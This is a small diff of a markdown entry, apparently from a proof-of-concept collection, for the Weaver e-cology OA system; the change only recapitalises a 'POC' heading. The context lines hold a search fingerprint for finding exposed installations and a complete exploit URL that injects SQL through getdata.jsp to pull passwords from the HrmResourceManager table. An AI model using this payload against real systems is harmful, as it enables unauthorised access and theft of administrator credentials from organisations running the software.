@@ -8,7 +8,7 @@
 app="泛微-OA（e-cology）"
 ```
 
-## poc
+## POC
 
 ```
 http://{{Hostname}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
